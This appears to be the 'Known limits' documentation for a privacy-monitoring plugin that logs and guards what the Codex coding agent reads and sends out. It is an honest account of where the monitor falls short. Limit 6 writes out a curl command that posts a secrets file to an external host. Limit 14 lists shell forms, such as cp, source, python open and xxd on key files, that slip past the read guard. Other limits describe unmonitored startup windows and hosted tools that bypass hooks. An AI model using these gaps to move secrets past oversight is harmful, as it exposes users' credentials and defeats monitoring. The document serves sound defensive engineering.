# Known limits

Stated up front, because a privacy tool that overclaims is worse than none:

## 1. The start of a session is unmonitored.

The daemon starts itself now (`architecture.md`'s lazy auto-spawn, built), but it loads ~2.8 GB of model weights before it binds its socket — about seven seconds. The hook that starts it does not wait, and the hooks that fire during the load get the same answer as a missing daemon: fail open on ingress with an "unverified" note, fail closed on egress. **Whatever is disclosed in those first seconds is not in the ledger, and no later reading can say what it was.** The ledger does now know that *something* is missing — see limit 2 — but knowing a gap exists is not knowing what fell into it, and nothing recovers the difference. Measured: a `codex exec` one-shot that finished in 8.2 s from a cold start recorded *nothing at all* — the daemon it started was still loading when the session ended, so for short non-interactive runs this is not "the first few seconds" but the whole session. An interactive session is a different story, since typing the first prompt already outlasts the load. Starting a daemon by hand before the session (step 2) is the only way to close that window. It reopens whenever the daemon exits and a later hook has to start a new one — which now happens five minutes after your last session ends, rather than in the middle of a session that merely went quiet for half an hour.

The same lifetime has one consequence at upgrade time: **upgrading the plugin while an older daemon is still running leaves the status item silent until that daemon exits** — about five minutes after its last session ends — because the running daemon is the only writer of the snapshot file and it is still the old code; restart Codex, or wait it out.

The other half of the trade: auto-start works only if `privacy-hud-setup` has recorded an interpreter that can load the model. It refuses to record one that cannot, and with no recorded interpreter no daemon is started at all — deliberately, since guessing one produces a daemon that detects nothing while looking healthy. `privacy-hud-doctor` is the detector for both states: it round-trips the socket, and it re-imports the recorded interpreter's stack.

## 2. "Unverified" marks the gaps it can see, and there are gaps it cannot.

A session whose record has a known hole renders `⚠unverified` on the ambient line and carries a `⚠ Session record incomplete` banner in the `$privacy` audit, instead of the clean `0%` that used to stand in for both "nothing was disclosed" and "nothing was recorded". Four things are recorded evidence and are detected: a session the ledger has no row for at all; a session whose beginning the daemon never saw (it cold-started late, or replaced one that died mid-session); a daemon replaced during a session; and hook calls that reached no daemon at all, which the daemon learns from the spawn-attempt latch the hook client leaves behind.

What is **not** detectable, and is not marked: a gap in the middle of a session while one daemon stayed up throughout. A hook Codex never fired, a hook whose 2 s client timeout expired against a busy daemon, a hosted tool that bypassed hooks (limit 3) — each of those leaves no trace anywhere, by construction, and no heuristic here guesses at one. So `⚠unverified` means "the ledger holds evidence of a hole"; its absence means "nothing on record contradicts a complete account", which is a weaker claim than "complete" and must not be read as the stronger one. The marker also does not appear if `PLUGIN_DATA` is unwritable or auto-spawn is off (`PRIVACY_HUD_NO_SPAWN`), because then no latch is written and the dropped hooks leave nothing behind either.

## 3. Hosted tools bypass hooks.

WebSearch and similar do not trigger local function-tool hook paths. This is a practical guardrail, not a complete enforcement boundary.

## 4. No `ask` decision in Codex hooks, and no interactive consent at all.

A hook can allow or deny. It cannot ask. The design's answer was a deny → review → one-shot-token → retry loop rather than a modal, and **that loop cannot be entered**: the engine's half exists — `Engine.observe` calls `consume_token` and handles `allow_once` — but no surface mints a token. Not `$privacy`, not the audit UI, not an MCP tool. See limit 13, which says the same thing from the other end.

So in practice a denied call stays denied for the session. Until a mint site exists, read any description of the retry loop — in `design.md` §8 or `architecture.md` §8 — as design intent, not as behaviour.

## 5. The status-line item lives in a separately built Codex — never in your official one.

`tui.status_line` accepts only built-in identifiers compiled into the binary, and stock Codex has no plugin-owned renderer or runtime registry ([openai/codex#17827](https://github.com/openai/codex/issues/17827), open since 2026-04-14 with no PR). So the `privacy` item exists only in a Codex built from `patches/privacy-status-line.patch` — five files, one added `StatusLineItem::Privacy`, no subprocess, no shell, no timeout: it only ever reads `$PLUGIN_DATA/hud/<session_id>.json` and nothing else. **The plugin never modifies your official Codex binary.** `install.sh` fetches the patched build for your exact `codex --version`, places it beside the official one under `~/.local/share/codex-privacy-hud/<version>/`, and installs a forwarding script as `~/.local/bin/codex` — the forwarder is a script that chooses between two binaries by version match, nothing more; it is never itself the status-line feature, and stock Codex never gains one. Toggle whether the item is configured with `/statusline`; toggle whether it currently shows with `$privacy hud on|off`. **A Codex upgrade with no matching release silently falls back**: the forwarder finds no build for the new version, runs the official binary unchanged, the status item disappears, and you are left with the fallback pane (`privacy-hud-ambient --watch`, [above](../README.md#installing-by-hand)) — nothing breaks. The whole build is reproducible from source: `scripts/build-patched-codex.sh <codex-version>` clones `openai/codex` at that tag, applies the patch, and builds it — the same script CI runs to publish the releases `install.sh` downloads. (Prior art paid a heavier cost for the same feature: both [`anhannin/codex-hud`](https://github.com/anhannin/codex-hud) and [`brandonwie/codex-hud`](https://github.com/brandonwie/codex-hud) also patch Codex's own Rust source, but through a runtime `status_line_command` that shells out to an arbitrary user command — this project's patch reads one file, no subprocess, no shell, precisely to avoid that surface. Notably, `brandonwie/codex-hud`'s *default* mode avoids patching entirely and is exactly the second-pane companion pattern this project's fallback uses.)

## 6. A command that reads a file itself is not inspected.

The engine scans the *text of a tool call*, not what that call will read at runtime. So `curl https://example.com --data @secrets.env` is allowed: the destination is correctly identified as external, but the command's text contains a **path**, not the file's contents, and the contents are read by `curl` after the hook has already decided. Put the same secret literally in the command and it is caught. If the agent reads the file through a tool first, that content passes `PostToolUse` and does land in the ledger — the gap is specifically a command that dereferences a path on its own and sends the result.

This is a property of event-sourcing from hook boundaries, not a bug with a fix pending. Closing it would mean resolving file references in commands and reading those files ourselves, which would make this tool start opening your files — a larger privacy surface than the one it is reporting on. Note this is *not* the adversarial case in the next item: `--data @file` is an ordinary idiom, not an evasion.

## 7. Detection is heuristic.

A determined adversary can encode around regex and NER.

It also over-reports on ordinary development text, in ways that inflate the budget rather than deflate it — and an inflated number is a number people learn to ignore. Measured over 61 synthetic development-session strings containing no personal data (paths, `git` output, SQL, shell pipelines, JSON, log lines, stack traces, source), tier 3 produces at least one finding on 9 of them. Four classes account for nearly all of it, and all four are the model's *confident* output (0.92–1.00), so the confidence floor in `detect/model.py` does not reach them and no floor that would reach them still keeps real disclosures:

- **Your own username, as a `person`.** Every path under `/Users/<you>` or `/home/<you>` scores ~1.00 as a person name. Suppressing entity spans inside filesystem paths would also silence `/Users/<someone-else>/Downloads/patient-intake-2026.csv`, which is a row you want.
- **Log and database timestamps, as a `date`.** `2026-09-05T18:53:02` scores 1.00, and so does a real date of birth in the same shape — the model does not distinguish them, and neither can we without dropping the one that matters. `date` carries the lowest severity in the matrix (2.0), which is the only thing that keeps this cheap.
- **Identifier-shaped and size-shaped numbers**, as `person`, `account`, `address`, or `credential`: container image IDs, UUIDs, digests, `SEQ=00194427`, the byte counts in `ls -l` output. A UUID scores 0.978 as a secret while a genuine database password scores 0.949, so this one is provably not separable by confidence.
- **Capitalized words in structured data**, as a `person`: `"tool_name": "Bash"` scores 1.00.

Read a `person` or `date` row on a `Bash` source with that in mind: the exemplar column is there so you can tell at a glance which findings are yours and which are the machine's.

## 8. Which session is being shown is inferred, not read — and the audit says so when it cannot be sure.

Codex exposes no session id to a skill, so the session to audit is worked out rather than read: the daemon knows which session fired a hook most recently, and running `$privacy` itself fires one (the skill runs bash, which is a `PreToolUse` in the session you typed in), so the asking session is the most recently active one. Two consequences. With **two sessions active in the same few seconds** the signal cannot separate them — the audit names the other active session in a line above the table instead of picking one silently, its header reads `Most recently active session` rather than `Current session`, and `$privacy <session id>` audits a specific one. With **no daemon to ask**, it falls back to the most recently started session in the ledger and labels it as that, in both the note and the table header, rather than as yours; a session with no daemon is also not being recorded (limit 1), so that is the state in which the numbers mean least.

The ambient line (limit 5) resolves the same way, so the pane beside your window and the audit typed into it name the same session. It does so on a slower clock — once when it starts and roughly every 30 s after, not on every two-second redraw — because that resolution asks the daemon over the socket the hooks use, and because a HUD that changed which session it was reporting on between redraws would be unreadable. Two things follow. A session that starts right after a re-resolution can take up to half a minute to appear in the pane. And the ambient line carries **no marker for session ambiguity at all**: at 52 columns there is no honest room for one, and the `⚠unverified` glyph is not available for it — that marker means the session's *record* has a known hole (limit 2), and one glyph cannot mean two things. If you need certainty about which session a pane is showing, pin it with `privacy-hud-ambient --session-id <id>`, or ask `$privacy`, which has the room to explain itself.

## 9. Nothing recalls disclosed data.

Ever.

## 10. A source rule matches the whole value, normalised — not a summary of it, and not a byte comparison either.

A model that summarizes, rewrites, or quotes part of what it read defeats it, and that is a likely path rather than an exotic one. The rule's promise is "this value does not leave unchanged", not "nothing about this file leaves".

This said "byte-identical" until #49 item 7, and that was wrong in the other direction. Matching keys on `mask.value_hash`, which is an HMAC of `value.strip().lower()` (`mask.py:21`) — the same hash the taint map is keyed by (`engine.py:448`). So the set that matches is **wider** than byte-identical: two values differing only in case or surrounding whitespace are one value here. Whether that is the right identity is open (#43, #44); what is not open is describing it as a byte comparison.

Collapsing two sightings into one ledger row needs more than a hash collision — the row's key is `(session_id, value_hash, destination)` — so a `×N` count is N hits on that key, not N distinct values and not N hops.

## 11. Origin extraction is best-effort.

`cat .env` is recognised; `python -c "open('.env')"` is not. A path under your own home directory is recorded as `~/…`: the account name is kept out of the ledger, the same way `runtime.display_path` keeps it out of a report and a masked exemplar reads `/Users/•••/app.log`. Another account's home is left as it is — that is a row you want to be able to read. A row with no origin offers no rule, rather than offering one that would not work.

Within the commands it does read, it errs the same way: a candidate that is not shaped like a path (`cat Makefile`, or a file named by an option the extractor does not know) is recorded as the command, not as a file. The cost of guessing wrong runs the other way — `events.source` is persisted, served and rendered, so an option value taken for a filename would put an argument, possibly a credential, into the ledger (I1).

## 12. The taint map dies with the daemon.

A daemon replaced mid-session loses it, and source rules stop matching with no error. The ledger marks such a session `⚠unverified` (limit 2 already detects a replaced daemon), but that marker means "this session's record has a hole", not "your rules stopped applying" — state both, separately.

## 13. No policy rule can be removed within the session that wrote it.

There is no removal path for any of them: nothing deletes a policy row — no `remove_policy`, no `DELETE FROM policy` anywhere in the code. This is **not new with source rules**; it has always been true of `Protect future occurrences` (a `mask` rule) as well, and was simply never written down. A rule written by mistake is lived with.

For a source rule there is also no way around it in the moment: an "allow once" token does not override one, because an origin deny is decided before the token is consulted and the token path only runs on a call that is otherwise allowed. This is not a workaround you are missing — no surface mints such a token today: not `$privacy`, not the audit UI, not an MCP tool.

What limits every rule is the session. `Ledger.add_policy` scopes it to `session:<id>`, so it applies until that session ends and not after — a new Codex conversation starts with none of them. That is the only escape, and it is the same one the red band already points at for context: what the old session sent stays sent.

## 14. Only a shell command whose read the extractor recognises is stopped.

**The guard covers one tool: the shell.** A read reaches the guard only as a `Bash` tool call, because that is how Codex reads a file — it has no native file-read tool, so the model shells out to `cat` or `sed -n`. Any other tool is allowed unexamined, including one a plugin adds that takes a file path and reads it. The plugin does not enumerate the tools Codex can send, and a path in an unknown tool's arguments is as likely to be written as read, so blocking on one would risk refusing a write under a message that says "blocked a read".

Within the shell, the guard acts on the path `origin.extract_origin` reads out of the command text — limit 11 holds that mechanism and its "never guess" rule. A command it does not resolve to a path is allowed: no deny, no notice, no ledger row. This is limit 6's root cause seen from the other side; the engine reads the text of a tool call, not what the call will do.

Ordinary shell forms that are not stopped, in three groups:

- **The verb is not one of the read verbs.** `wc -l .env`, `source .env`, `. .env`, `cp .env /tmp/x` and `openssl rsa -in key.pem` all put the file's bytes somewhere; none of them is `cat`. So does `python -c "open('.env')"`.
- **The argument is not shaped like a path.** `strings id_rsa` and `cat id_rsa` record the command, not the file: a bare word with no `/` and no extension is not taken for a filename, for the reason limit 11 gives — an option value mistaken for one would be persisted in `events.source` (I1). `strings ./id_rsa` and `xxd ~/.ssh/id_rsa` are stopped.
- **The flag is not one the extractor knows for that verb.** `head -5 .env` is allowed; `head -n 5 .env` is stopped.

And within the paths it does resolve: the pattern behind `.env` requires a start of string or a separator (whitespace, `/`, `=`, a quote) just before it, so `prod.env` is not matched — the guard covers the paths those patterns name, not every file that looks like an env file.

## 15. A template file is never blocked.

`.env.example` is committed to be read, and blocking it stops ordinary work while the user's only escape is turning the guard off — so the guard carves it out, even one that really holds a key. Detection still flags it, so such a file still shows up in the audit.

## 16. Nothing is blocked until you turn it on.

The default records the read and mentions the guard once per session; it stops nothing. `$privacy read status` says which state you are in.

## 17. A blocked read can leave a record that says the opposite, in one sequence.

The ledger dedupes on `(session_id, value_hash, destination)` (`ledger.py`'s `record`): if a row for that exact key already exists, the write only increments its `count` — the `kind` of the existing row does not change. So if the same path was already read with the guard off (recorded as `local_access`), turning the guard on and reading it again denies the call, but the ledger still shows only that one `local_access` row with its count incremented — no `prevented` row appears. What is left is not silence. `cat deploy/key1.pem` with the guard off, then `cat deploy/key2.pem` with it on, leaves one row reading `local_access`, `source=deploy/key1.pem`, `count=2`, `protection=NULL` — a record that says key1 was read twice and nothing was blocked. Both halves of that are wrong, and nothing in the audit contradicts them.

It carries into the number on screen. `Ledger.summary` computes `prevented` as `COUNT(*)` of rows whose `kind` is `prevented`, and `dispatch` passes that straight to the status item as `blocked`. No `prevented` row was written, so the badge stays `0` through a deny that did happen.

Enforcement holds; the evidence does not. This is pre-existing on the egress side too: an allowed egress followed by a denied one for the same value and destination dedupes the same way. It matters here because the feature's own discovery path — read, see the notice, turn the guard on, read again — walks straight into it.

## 18. A blocked read's row does not name the file.

The finding behind a blocked read is the tier-0 pattern that matched the command text (`.pem`, `.env`, `id_rsa`, …), not the path itself, so its `value_hash` is a hash of that pattern text. `cat deploy/key1.pem` and `cat deploy/key2.pem` both record `.pem` at the same `destination` and dedupe into one row. You can see that something was blocked; you cannot see which file.

The count on screen goes with it. Two clean denies of those two files — no earlier `local_access` row, so limit 17 does not apply — write one `prevented` row with `count=2`, and `Ledger.summary` counts rows, not calls: `prevented=1`, so the status item's blocked badge reads `1` for two denied reads. The badge counts distinct patterns blocked, not reads stopped, and under-counts by however many files share a pattern.

## 19. What a subagent inherited is not recorded.

`SubagentStart` is one of the four accounting chokepoints in `architecture.md`, and the observation built for it carries no text: `dispatch.py:527` constructs it with `text=""`, so no detector ever runs on it and no row can result. A subagent is still a `destination` for data sent to it through a tool call, but the question "did the subagent inherit the `.env` the main agent had read?" — named in `PRD.md` as one the product answers — has no answer in the ledger.

This says nothing about what happens *inside* a subagent's own session, which has its own hooks and its own session id.

## 20. A destination is a boundary category, not a recipient.

`destination` holds the kind of boundary crossed — `model_context`, `subagent`, `mcp_tool`, `external_net`, `local` — and not who was on the other side. `dispatch.py:489` collapses every MCP call to `mcp_tool` before the engine sees it, so sending the same value to a second MCP server adds no destination and no further contribution to the budget.

The `destinations` tile therefore counts boundary categories — a handful at most — not services. `architecture.md` specifies `subagent:<id>`, `mcp:<server>` and `net:<host>`; that detail is stripped today.

## 21. On an outbound call, the deep scan is best-effort.

Until #47 item 1 the deep scan never ran on an outbound call at all, so `email`, `person`, `address`, `phone` and `account` — the five types only it can find — could not appear on any egress row, whatever the tool was sending. It runs there now, under a bound the ingress path does not have.

The model is a serial resource: one inference pipeline, one lock, around half a second per scan on the machine it was measured on. The hook client gives the daemon 2.0 s per socket operation, and I6 turns a missed deadline on an outbound call into a **deny**. Before this, an egress decision was regex-only and never waited for the model (it still waited for the ledger lock, as every request does); a version that simply queued behind other sessions' scans would have reproduced a failure already measured here — a benign `curl https://example.com/health` denied, at 2002 ms, because six unrelated ingress scans were in flight.

So an outbound call waits at most `engine.TIER3_EGRESS_BUDGET` (1.0 s — half the client's budget, the other half left as margin for the parts this does not bound), and one outbound scan runs at a time. A second outbound call while one is in flight does not queue: it takes the fast tiers immediately.

**The budget bounds the wait, not the scan.** Nothing here stops a model call that is already running — Python cannot cancel one — so what the budget guarantees is that the call stops *waiting* at 1.0 s, and that a result arriving after that is discarded rather than used. The inference finishes on its own thread, releases the slot for the next call, and its findings go nowhere. Measured with this budget and a detector that holds the interpreter: the call returned at 1.25 s, reported a timeout, and dropped the findings.

**This bounds the deep scan, not the round trip.** What is bounded is the time the detection phase spends waiting for, and accepting the result of, the deep scan — not the time the whole request takes. Lock contention on the ledger, sqlite and the socket are outside it, and nobody has measured the end-to-end distribution against the client's 2.0 s, so this is a guard against the failure that was measured, not a proof that the hook always answers in time.

**The fallback is not decision-neutral.** It is tempting to say only the record suffers, and that is wrong: `detect/model.py`'s label map includes `SECRET`, so the deep scan can produce the `credential` finding that blocks a call, and a `mask` rule can only fire on a finding some tier actually produced. An outbound call that falls back to the fast tiers can therefore be allowed where a completed scan would have denied it, and can go unmasked where a completed scan would have masked it. That is exactly what every outbound call did before #47 item 1, which is why it is an acceptable fallback — and why it is recorded rather than silent.

**What you see.** Each skipped scan writes a row to `scan_gaps`, so `coverage` for that session stops reading as verified instead of showing a clean account. The banner names one reason at a time and the shallow-scan count is the last of them, so a session that *also* started unobserved or survived a daemon restart shows that instead — the account is still marked incomplete, but the line you read will not mention the scans. That covers the case a per-event flag could not: an outbound call whose fast tiers found nothing and whose deep scan was skipped writes no event row at all, and would otherwise be indistinguishable from a call that was fully scanned and was clean. The same recording now applies to the other ways a qualifying deep scan can fail to cover an observation: a payload over `engine.MAX_TIER3_CHARS` (8192 characters), a machine whose weights never loaded, and — since it used to be the one that looked cleanest — an inference that raised. That last one returned an empty result and was counted as a scan that ran and found nothing; the detector now marks itself unavailable instead, so the gap is recorded like the rest.

One consequence of that worth knowing: a detector that fails mid-inference marks itself unavailable and stays that way for the life of the daemon, so a single transient failure takes the deep scan out until the daemon restarts (five minutes after your last session ends, or sooner if you restart it). Every later observation *that the deep scan would have applied to* is recorded as a gap — a local read is not one, since the deep scan never runs there — so those sessions are marked rather than silently shallow. They are all shallow.

What is still missing is *which* calls: the gap count is per session, and no individual row is marked.

How often this happens has not been measured on real sessions. The contention half needs a second scan in flight, which one idle session will not produce — but the size cap and a model that fails to load or fails mid-inference do not need contention at all, and the last of those is a scan that ran, crashed, and is counted here because it cannot be told apart from one that found nothing.

## Note on tests

`cargo test -p codex-tui` and the upstream `insta` picker snapshots have not been run anywhere.
